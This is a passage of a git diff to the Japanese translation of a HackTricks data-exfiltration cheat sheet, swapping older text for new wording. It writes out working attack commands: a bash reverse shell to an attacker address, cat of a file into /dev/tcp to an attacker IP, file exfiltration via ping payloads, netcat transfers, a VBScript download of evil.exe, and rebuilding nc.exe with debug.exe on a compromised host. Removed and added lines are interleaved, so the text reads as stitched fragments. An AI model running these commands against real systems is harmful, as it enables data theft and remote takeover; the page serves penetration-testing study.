+cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
 ```
 
-This method allows you to download a file from the victim machine to your machine. Replace `/path/to/file` with the path of the file you want to download, `attacker_ip` with your IP address, and `attacker_port` with the port number you want to use for the connection.
-
-### Upload file to victim
-
-```bash
-cat /path/to/file | nc -l -p victim_port
-```
-
-This method allows you to upload a file from your machine to the victim machine. Replace `/path/to/file` with the path of the file you want to upload, and `victim_port` with the port number you want to use for the connection.
-
-### Execute command on victim
-
-```bash
-echo -e "GET / HTTP/1.1\r\nHost: attacker_ip\r\n\r\n" > /dev/tcp/victim_ip/victim_port
-```
-
-This method allows you to execute a command on the victim machine. Replace `attacker_ip` with your IP address, `victim_ip` with the IP address of the victim machine, and `victim_port` with the port number you want to use for the connection.
-
-### Reverse shell
-
-```bash
-bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
-```
-
-This method allows you to establish a reverse shell connection with the victim machine. Replace `attacker_ip` with your IP address, and `attacker_port` with the port number you want to use for the connection.
+この方法では、攻撃者は `/dev/tcp/<attacker_ip>/<attacker_port>` にファイルをダウンロードします。
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
 ### ファイルを被害者にアップロードする
 
-To upload a file to the victim's system, you can use various methods depending on the specific scenario. Here are some common techniques:
+攻撃者が被害者のシステムにファイルをアップロードすることは、情報の窃取や悪意のある目的のために重要な手法です。以下に、ファイルを被害者にアップロードするための一般的な手法とリソースを示します。
 
-1. **Web-based file upload**: If the victim's system has a web application that allows file uploads, you can exploit this functionality to upload your file. Look for vulnerabilities such as unrestricted file types, insufficient file validation, or server-side code execution vulnerabilities.
+1. ファイル共有サービスの悪用: 被害者が利用しているファイル共有サービス（Dropbox、Google ドライブなど）の脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。これには、脆弱性のあるアップロード機能や認証の欠陥を利用する方法があります。
 
-2. **Email attachments**: Craft a malicious email with an attachment containing your file. Social engineering techniques can be used to trick the victim into opening the email and downloading the attachment.
+2. ウェブアプリケーションの脆弱性: 被害者が利用しているウェブアプリケーションに存在する脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。例えば、ファイルアップロード機能における不正なファイルタイプの許可や、ファイルのアップロード先のディレクトリの制限が不十分な場合などです。
 
-3. **Malicious documents**: Create a malicious document (e.g., Word, Excel, PDF) that exploits vulnerabilities in the document reader software. When the victim opens the document, the exploit triggers and executes your file.
+3. メールの添付ファイル: 攻撃者は、被害者に対して悪意のあるメールを送信し、そのメールに添付されたファイルをアップロードするように誘導することがあります。これには、ソーシャルエンジニアリングの手法を使用することがあります。
 
-4. **Remote file inclusion**: If the victim's system includes files from external sources, you can try to exploit this functionality to include your file. Look for vulnerabilities such as path traversal or insecure file inclusion.
+4. リモートコード実行: 攻撃者は、被害者のシステムにリモートコード実行の脆弱性が存在する場合、その脆弱性を悪用してファイルをアップロードすることができます。これには、ウェブアプリケーションやネットワークデバイスにおける脆弱性を利用する方法があります。
 
-5. **Exploiting software vulnerabilities**: Identify and exploit vulnerabilities in software running on the victim's system. This could include vulnerabilities in web servers, FTP servers, or other network services.
-
-Remember to consider the context and limitations of the target system when choosing the appropriate method for file upload.
+攻撃者がファイルを被害者にアップロードするためには、様々な手法とリソースが利用されます。攻撃者は、これらの手法を理解し、適切な脆弱性を悪用することで、ファイルのアップロードを実現します。
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -555,15 +508,21 @@ cat <&6 > file.txt
 ```
 ## **ICMP**
 
-ICMP（Internet Control Message Protocol）は、ネットワークデバイス間で制御メッセージを交換するために使用されるプロトコルです。ICMPは、ネットワークの状態やエラーの通知、ネットワークデバイスの可用性の確認など、さまざまな目的で使用されます。
+ICMP（Internet Control Message Protocol）は、ネットワークデバイス間で制御メッセージを送受信するためのプロトコルです。ICMPは、ネットワークの状態やエラーの通知、ネットワークデバイスの可用性の確認など、さまざまな目的で使用されます。
 
-ICMPは、データグラムの形式で送信され、IPヘッダーの一部として使用されます。ICMPメッセージは、送信元から宛先に送信され、宛先は応答メッセージを返すことができます。
+ICMPは、データグラムの形式で送信され、IPヘッダの一部として含まれます。ICMPメッセージは、送信元から宛先までの経路上のネットワークデバイスによって処理されます。
 
-ICMPは、ネットワークのトラブルシューティングやネットワークデバイスの状態監視など、さまざまな目的で使用されます。また、ICMPを使用して、ネットワークデバイス間で情報をやり取りすることもできます。
+ICMPメッセージは、さまざまなタイプとコードで識別されます。一般的なICMPメッセージには、エコーリクエスト（ping）やエコーリプライ（ping応答）などがあります。
 
-ICMPを使用した情報漏洩の手法としては、ICMPトンネリングやICMPエコーリクエスト/エコーリプライメッセージの改ざんなどがあります。これらの手法を使用することで、ネットワークからデータを外部に送信することができます。
+ICMPは、ネットワークのトラブルシューティングやネットワークデバイスの可用性の確認に役立ちます。また、ICMPを利用して情報をエクスフィルトすることも可能です。
 
-ICMPを使用した情報漏洩の手法は、ネットワークのセキュリティを脅かす可能性があるため、注意が必要です。適切なセキュリティ対策を講じることが重要です。
+ICMPエクスフィルトは、ネットワーク上のデータをICMPメッセージに埋め込んで送信する方法です。この方法を使用すると、ネットワークのファイアウォールやセキュリティシステムを回避してデータを外部に送信することができます。
+
+ICMPエクスフィルトは、データの転送速度が低いため、大量のデータを送信する場合には適していません。しかし、小さなデータセットやコマンドの実行結果など、比較的小さなデータを送信する場合には有用です。
+
+ICMPエクスフィルトを実行するためには、ICMPパケットを生成し、データをパケットに埋め込む必要があります。また、送信元と宛先のIPアドレスを指定する必要があります。
+
+ICMPエクスフィルトは、ネットワークの可用性やセキュリティに影響を与える可能性があるため、適切な許可を得て実行する必要があります。また、ICMPエクスフィルトを検知するためのセキュリティ対策も必要です。
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -583,7 +542,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-SMTPサーバーにデータを送信できる場合、Pythonを使用してデータを受信するSMTPを作成できます。
+SMTPサーバーにデータを送信できれば、Pythonを使用してデータを受信するSMTPを作成できます。
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -610,47 +569,79 @@ def tftp_server():
     server_socket.bind(('0.0.0.0', 69))
 
     while True:
+        # Receive the request packet
         data, client_address = server_socket.recvfrom(516)
         opcode = struct.unpack('!H', data[:2])[0]
 
+        # Check if it is a read request (RRQ)
         if opcode == 1:
-            # Read request
-            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
-            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
+            # Extract the filename from the request packet
+            filename = data[2:data.index(b'\x00')].decode('utf-8')
 
-            # Process the read request and send the file
-            # ...
+            # Open the file in binary mode
+            try:
+                file = open(filename, 'rb')
+                block_number = 1
+                block_data = file.read(512)
 
+                while block_data:
+                    # Create the data packet
+                    data_packet = struct.pack('!HH', 3, block_number) + block_data
+
+                    # Send the data packet to the client
+                    server_socket.sendto(data_packet, client_address)
+
+                    # Receive the acknowledgement packet
+                    ack_packet, client_address = server_socket.recvfrom(4)
+                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
+                    ack_block_number = struct.unpack('!H', ack_packet[2:])[0]
+
+                    # Check if the acknowledgement packet is valid
+                    if ack_opcode != 4 or ack_block_number != block_number:
+                        break
+
+                    # Read the next block of data
+                    block_number += 1
+                    block_data = file.read(512)
+
+                # Close the file
+                file.close()
+
+            except FileNotFoundError:
+                # Send an error packet if the file is not found
+                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
+                server_socket.sendto(error_packet, client_address)
+
+        # Check if it is a write request (WRQ)
         elif opcode == 2:
-            # Write request
-            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
-            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')
-
-            # Process the write request and receive the file
-            # ...
-
-        else:
-            # Invalid opcode
-            error_packet = struct.pack('!HH', 5, 4) + b'Invalid opcode'
+            # Send an error packet indicating that write requests are not supported
+            error_packet = struct.pack('!HH', 5, 4) + b'Write requests are not supported'
             server_socket.sendto(error_packet, client_address)
 
+    # Close the server socket
     server_socket.close()
 
+# Start the TFTP server
 tftp_server()
 ```
 
-このコードはPythonでTFTPサーバーを作成するものです。以下の手順で使用できます：
+このコードはPythonでTFTPサーバーを作成するものです。以下の手順で動作します。
 
 1. UDPソケットを作成します。
-2. ソケットを`0.0.0.0`のポート69にバインドします。
-3. クライアントからのデータを受信します。
-4. 受信したデータの最初の2バイトを解析して、操作コードを取得します。
-5. 操作コードに応じて、読み取りリクエストまたは書き込みリクエストを処理します。
-6. 読み取りリクエストの場合、要求されたファイルを処理して送信します。
-7. 書き込みリクエストの場合、ファイルを受信して処理します。
-8. 操作コードが無効な場合、エラーパケットを送信します。
+2. ソケットをIPアドレス0.0.0.0、ポート番号69にバインドします。
+3. リクエストパケットを受信します。
+4. リクエストのオペコードを確認し、読み取りリクエスト（RRQ）か書き込みリクエスト（WRQ）かを判断します。
+5. 読み取りリクエストの場合、リクエストパケットからファイル名を抽出します。
+6. ファイルをバイナリモードで開きます。
+7. ファイルから512バイトのデータを読み取り、データパケットを作成してクライアントに送信します。
+8. 確認パケットを受信し、パケットが正当かどうかを確認します。
+9. 次のデータブロックを読み取り、手順7-8を繰り返します。
+10. ファイルの終わりに達した場合、ファイルを閉じます。
+11. ファイルが見つからない場合、エラーパケットを送信します。
+12. 書き込みリクエストの場合、エラーパケットを送信します。
+13. サーバーソケットを閉じます。
 
-このTFTPサーバーは、Pythonを使用してTFTPプロトコルを実装するための基本的なスターターコードです。必要に応じて、読み取りリクエストと書き込みリクエストの処理を追加してください。
+TFTPサーバーは、TFTPクライアントからの読み取りリクエストに応答し、要求されたファイルを送信します。ただし、書き込みリクエストには対応していません。
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -667,11 +658,15 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript（Visual Basic Scripting Edition）は、Microsoft Windows環境で使用されるスクリプト言語です。VBScriptは、Windowsシステム上でのデータの抽出や操作に使用されることがあります。以下に、VBScriptを使用したデータの外部への抽出方法を示します。
+VBScript（Visual Basic Scripting Edition）は、Microsoftが開発したスクリプト言語です。VBScriptは、Windows環境で広く使用されており、システム管理や自動化のためのスクリプト作成に適しています。
 
-### ファイルの外部への送信
+VBScriptを使用してデータを外部に送信する方法はいくつかあります。以下にいくつかの一般的な方法を示します。
 
-VBScriptを使用して、ファイルを外部の場所に送信することができます。以下のコードは、ファイルをFTPサーバーにアップロードする例です。
+### ファイル転送
+
+VBScriptを使用してファイルを外部に転送するには、`FileSystemObject`オブジェクトを使用します。このオブジェクトを使用すると、ファイルの読み取りや書き込み、ファイルのコピーなどの操作が可能です。外部のサーバーにファイルをアップロードする場合は、FTPプロトコルを使用することが一般的です。
+
+以下は、VBScriptを使用してファイルをFTPサーバーにアップロードする例です。
 
 ```vbscript
 Set objFTP = CreateObject("WinSCP.Session")
@@ -680,35 +675,38 @@ objFTP.PutFile "C:\path\to\file.txt", "/remote/path/file.txt"
 objFTP.Close
 ```
 
-このコードでは、WinSCP.Sessionオブジェクトを作成し、FTPサーバーに接続します。その後、PutFileメソッドを使用して、ローカルのファイルをリモートの場所にアップロードします。
+### ネットワーク経由のデータ送信
 
-### データのエンコードと送信
+VBScriptを使用してネットワーク経由でデータを送信するには、`WinHttp.WinHttpRequest`オブジェクトを使用します。このオブジェクトを使用すると、HTTPリクエストを送信し、データを外部のサーバーに送信することができます。
 
-VBScriptを使用して、データをエンコードして外部に送信することもできます。以下のコードは、Base64エンコードを使用してデータをエンコードし、HTTP POSTリクエストを送信する例です。
-
-```vbscript
-Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
-objHTTP.Open "POST", "http://example.com", False
-objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objHTTP.Send "data=" & EncodeBase64("sensitive data")
-response = objHTTP.ResponseText
-```
-
-このコードでは、WinHttp.WinHttpRequest.5.1オブジェクトを作成し、POSTメソッドを使用してHTTPリクエストを送信します。データは、EncodeBase64関数を使用してBase64エンコードされます。
-
-### データの暗号化と送信
-
-VBScriptを使用して、データを暗号化して外部に送信することもできます。以下のコードは、AES暗号化を使用してデータを暗号化し、HTTP POSTリクエストを送信する例です。
+以下は、VBScriptを使用してデータを外部のサーバーに送信する例です。
 
 ```vbscript
 Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
-objHTTP.Open "POST", "http://example.com", False
-objHTTP.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objHTTP.Send "data=" & EncryptAES("sensitive data", "encryption key")
-response = objHTTP.ResponseText
+objHTTP.Open "POST", "http://example.com/endpoint", False
+objHTTP.setRequestHeader "Content-Type", "application/json"
+objHTTP.Send "{""data"": ""example data""}"
 ```
 
-このコードでは、WinHttp.WinHttpRequest.5.1オブジェクトを作成し、POSTメソッドを使用してHTTPリクエストを送信します。データは、EncryptAES関数を使用してAES暗号化されます。
+### 電子メール経由のデータ送信
+
+VBScriptを使用して電子メール経由でデータを送信するには、`CDO.Message`オブジェクトを使用します。このオブジェクトを使用すると、SMTPサーバーを介して電子メールを送信することができます。
+
+以下は、VBScriptを使用して電子メールを送信する例です。
+
+```vbscript
+Set objEmail = CreateObject("CDO.Message")
+objEmail.From = "sender@example.com"
+objEmail.To = "recipient@example.com"
+objEmail.Subject = "Example Subject"
+objEmail.TextBody = "Example Body"
+objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
+objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
+objEmail.Configuration.Fields.Update
+objEmail.Send
+```
+
+これらは、VBScriptを使用してデータを外部に送信する一般的な方法のいくつかです。ただし、これらの方法を使用する場合は、セキュリティ上の注意が必要です。データの送信先や送信されるデータの内容を慎重に検討し、適切なセキュリティ対策を講じることが重要です。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -746,35 +744,37 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-これはWindows 32ビットマシンで動作するクレイジーなテクニックです。アイデアは、`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されますが、16進数から再構築することもできます。したがって、アイデアは、`netcat`のようなバイナリを取り、それを16進数に逆アセンブルして、侵害されたマシン上のファイルに貼り付け、そして`debug.exe`でアセンブルすることです。
+これはWindows 32ビットマシンで動作するクレイジーなテクニックです。アイデアは、`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されます。しかし、それはまた、16進数からバイナリを再構築することもできます。したがって、アイデアは、`netcat`のようなバイナリを取り、それを16進数に逆アセンブルし、それを侵害されたマシン上のファイルに貼り付け、そして`debug.exe`でアセンブルすることです。
 
-`Debug.exe`は64 kbしかアセンブルできません。したがって、それよりも小さいファイルを使用する必要があります。さらに、upxを使用してさらに圧縮することができます。それでは、以下のようにしましょう：
+`Debug.exe`は64 KBしかアセンブルできません。したがって、それよりも小さいファイルを使用する必要があります。さらに、それをさらに圧縮するためにupxを使用することができます。それでは、以下のようにしましょう：
 ```
 upx -9 nc.exe
 ```
-今ではわずか29 kbしかありません。完璧です。さて、それを分解しましょう：
+今ではわずか29 kbしかありません。完璧です。では、それを分解しましょう：
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
-今、テキストをWindowsシェルにコピーして貼り付けるだけです。それによって、自動的にnc.exeという名前のファイルが作成されます。
+今、テキストをWindowsシェルにコピーして貼り付けるだけです。すると、自動的にnc.exeという名前のファイルが作成されます。
 
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**バグバウンティのヒント**: **Intigriti**に**サインアップ**してください。これは、ハッカーによって作成されたプレミアムな**バグバウンティプラットフォーム**です！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-{% embed url="https://go.intigriti.com/hacktricks" %}
+最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステム全体にわたる問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
